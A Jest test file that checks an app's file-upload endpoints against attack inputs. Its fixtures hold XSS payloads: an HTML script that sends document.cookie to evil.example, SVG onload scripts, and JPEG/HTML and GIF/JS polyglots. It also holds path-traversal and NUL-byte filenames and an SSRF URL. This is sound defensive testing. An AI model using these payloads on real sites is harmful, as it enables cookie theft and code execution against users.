/**
 * What the upload endpoints store, decided from the bytes (upload.allowlist.ts),
 * against the real backend with the real file-type, Multer and storage
 * (STORAGE_PROVIDER=local, as wherever /uploads is served from the app's own
 * origin). Each row is an attack and what it must come to: refused with a
 * 400 and nothing written, or stored under a random name with the extension
 * of what the bytes really are, inside the upload directory.
 *
 * How a stored file is then served (nosniff, the sandbox CSP, a download for
 * anything not an image or a video) is upload.serve.spec.ts, the Next.js
 * route's spec, tests/e2e/specs/uploads.spec.ts and scripts/check-nginx-uploads.sh.
 */
import { existsSync, readdirSync, statSync } from 'fs';
import { join } from 'path';
import { startApp, TestApp } from './setup/app';
import { Session } from './setup/api';
import { apiKeyOf, disconnectDb, givePlan } from './setup/db';
import { UPLOAD_DIR } from './setup/test-env';
import { LocalStorage } from '@hookpost/nestjs-libraries/upload/local.storage';

const PNG = Buffer.from(
  '89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489' +
    '0000000d4944415478da63fccfc0500f000485018084a98c210000000049454e44ae426082',
  'hex'
);
const JFIF = Buffer.from('ffd8ffe000104a46494600010100000100010000', 'hex');
/** A JPEG comment segment (FF FE, length) holding `text`. */
const jpegComment = (text: string) => {
  const body = Buffer.from(text, 'latin1');
  const len = Buffer.alloc(2);
  len.writeUInt16BE(body.length + 2);
  return Buffer.concat([Buffer.from([0xff, 0xfe]), len, body]);
};
const JPEG_END = Buffer.from('ffd9', 'hex');
const HTML = '<!doctype html><html><body><script>fetch("https://evil.example/?c="+document.cookie)</script>';
const SVG = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><script>alert(1)</script></svg>';

type Row = [attack: string, name: string, type: string, bytes: Buffer];

const REFUSED: Row[] = [
  ['an HTML page', 'x.html', 'text/html', Buffer.from(HTML)],
  ['an SVG with a script', 'x.svg', 'image/svg+xml', Buffer.from(SVG)],
  ['an SVG named .png and sent as image/png (wrong extension)', 'x.png', 'image/png', Buffer.from(SVG)],
  ['JavaScript', 'x.js', 'application/javascript', Buffer.from('alert(document.cookie)')],
  ['an XHTML page sent as image/jpeg', 'x.jpg', 'image/jpeg', Buffer.from(`<?xml version="1.0"?>${HTML}`)],
  ['a JPEG/HTML polyglot (HTML in a comment segment)', 'x.jpg', 'image/jpeg', Buffer.concat([JFIF, jpegComment(HTML), JPEG_END])],
  ['a JPEG with a script tag in its metadata', 'x.jpg', 'image/jpeg', Buffer.concat([JFIF, jpegComment('<script src=//evil.example/x.js></script>'), JPEG_END])],
  ['an MP4 whose first bytes read "<p >" (opens as HTML)', 'x.mp4', 'video/mp4', Buffer.concat([Buffer.from('<p >ftypisom', 'latin1'), Buffer.alloc(32)])],
  ['a double extension with HTML inside (x.php.jpg)', 'x.php.jpg', 'image/jpeg', Buffer.from(HTML)],
  ['a double extension with HTML inside (x.html.png)', 'x.html.png', 'image/png', Buffer.from(HTML)],
  ['a PDF', 'x.pdf', 'application/pdf', Buffer.from('%PDF-1.7\n1 0 obj\n<< /JS (app.alert(1)) >>\nendobj\n')],
  ['an empty file', 'x.png', 'image/png', Buffer.alloc(0)],
  ['a huge image (11 MB, the image limit is 10 MB)', 'big.png', 'image/png', Buffer.concat([PNG, Buffer.alloc(11 * 1024 * 1024)])],
];

const STORED: Row[] = [
  ['a real PNG named .html and sent as text/html (wrong extension)', 'evil.html', 'text/html', PNG],
  ['a real PNG with a double extension (evil.html.png)', 'evil.html.png', 'image/png', PNG],
  ['a real PNG with a double extension (evil.php.png)', 'evil.php.png', 'application/x-php', PNG],
  ['a path traversal in the file name', '../../../../../../etc/cron.d/pwn.png', 'image/png', PNG],
  ['a NUL in the file name', 'pwn.png%00.html', 'image/png', PNG],
];

const filesIn = (dir: string): string[] => {
  if (!existsSync(dir)) return [];
  return readdirSync(dir).flatMap((name) => {
    const full = join(dir, name);
    return statSync(full).isDirectory() ? filesIn(full) : [full];
  });
};

describe('upload hardening: what is stored on the app origin', () => {
  let t: TestApp;
  let owner: Session;
  let key: string;
  // The directory is shared with the rest of the suite (and other runs).
  let initial: Set<string>;

  beforeAll(async () => {
    initial = new Set(filesIn(UPLOAD_DIR));
    t = await startApp();
    owner = await t.api.register({ company: 'Uploads Attack Co' });
    const orgId = (await owner.self()).orgId;
    await givePlan(orgId, 'STANDARD');
    key = await apiKeyOf(orgId);
  });
  afterAll(async () => {
    await t?.close();
    await disconnectDb();
  });

  const ENDPOINTS: Array<[string, (form: FormData) => Promise<{ status: number; body: any }>]> = [
    ['POST /media/upload-simple', (form) => owner.request('POST', '/media/upload-simple', { raw: form })],
    ['POST /media/upload-server', (form) => owner.request('POST', '/media/upload-server', { raw: form })],
    ['POST /public/v1/upload (API key)', (form) => t.api.request('POST', '/public/v1/upload', { raw: form, headers: { authorization: key } })],
  ];
  const form = ([, name, type, bytes]: Row) => {
    const f = new FormData();
    f.append('file', new Blob([new Uint8Array(bytes)], { type }), name);
    return f;
  };

  describe.each(ENDPOINTS)('%s', (_endpoint, send) => {
    it.each(REFUSED)('refuses %s: 400, nothing written', async (...row) => {
      const before = new Set(filesIn(UPLOAD_DIR));
      const res = await send(form(row));
      expect(res.status).toBe(400);
      expect(filesIn(UPLOAD_DIR).filter((f) => !before.has(f))).toEqual([]);
    });

    it.each(STORED)('stores %s as a random .png inside the upload directory', async (...row) => {
      const before = new Set(filesIn(UPLOAD_DIR));
      const res = await send(form(row));
      expect(res.status).toBe(201);
      expect(res.body.path).toMatch(/\/uploads\/\d{4}\/\d{2}\/\d{2}\/[0-9a-f]+\.png$/);
      const added = filesIn(UPLOAD_DIR).filter((f) => !before.has(f));
      expect(added).toHaveLength(1);
      expect(added[0].startsWith(UPLOAD_DIR + '/')).toBe(true);
      expect(added[0].endsWith(res.body.path.split('/uploads/')[1])).toBe(true);
      // The name the person gave is only a label, with no path in it.
      if (res.body.originalName) {
        expect(res.body.originalName).not.toMatch(/[\\/]/);
        expect(res.body.originalName).toMatch(/\.png$/);
      }
    });
  });

  // A GIF header that is also a line of JavaScript is a real GIF to any
  // sniffer, so it is stored. It cannot run: it is served as image/gif with
  // nosniff, which a browser refuses to execute as a script (shown in
  // tests/e2e/specs/uploads.spec.ts with a planted copy).
  it('stores a GIF/JS polyglot as .gif (inert: image/gif + nosniff when served)', async () => {
    const f = new FormData();
    f.append('file', new Blob([Buffer.from('GIF89a/*\x00\x00*/=1;alert(document.domain);//', 'latin1')], { type: 'application/javascript' }), 'x.js');
    const res = await owner.request('POST', '/media/upload-simple', { raw: f });
    expect(res.status).toBe(201);
    expect(res.body.path).toMatch(/\/[0-9a-f]+\.gif$/);
  });

  it('nothing outside the upload directory was written by the traversal names', () => {
    expect(existsSync('/etc/cron.d/pwn.png')).toBe(false);
    expect(existsSync(join(UPLOAD_DIR, '..', 'pwn.png'))).toBe(false);
    const written = filesIn(UPLOAD_DIR).filter((f) => !initial.has(f));
    expect(written.length).toBeGreaterThan(0);
    for (const file of written) {
      expect(file).toMatch(/\/[0-9a-f]+\.(png|gif)$/);
    }
  });

  describe('LocalStorage.uploadSimple: data URLs and fetched files', () => {
    const storage = () => new LocalStorage(UPLOAD_DIR);
    const dataUrl = (type: string, bytes: Buffer) => `data:${type};base64,${bytes.toString('base64')}`;

    it.each([
      ['an SVG data URL', dataUrl('image/svg+xml', Buffer.from(SVG))],
      ['an HTML data URL', dataUrl('text/html', Buffer.from(HTML))],
      ['an HTML data URL that claims to be a PNG', dataUrl('image/png', Buffer.from(HTML))],
      ['a JPEG/HTML polyglot data URL', dataUrl('image/jpeg', Buffer.concat([JFIF, jpegComment(HTML), JPEG_END]))],
      ['a plain-text data URL', `data:text/html,${encodeURIComponent(HTML)}`],
    ])('refuses %s', async (_what, url) => {
      await expect(storage().uploadSimple(url)).rejects.toThrow('Unsupported file type.');
    });

    it('stores a real PNG data URL as .png', async () => {
      expect(await storage().uploadSimple(dataUrl('image/png', PNG))).toMatch(
        /\/uploads\/\d{4}\/\d{2}\/\d{2}\/[0-9a-f]+\.png$/
      );
    });

    it('refuses a URL that is not public HTTPS before fetching it', async () => {
      await expect(storage().uploadSimple('http://127.0.0.1:1/x.png')).rejects.toThrow('Unsafe URL');
    });
  });
});
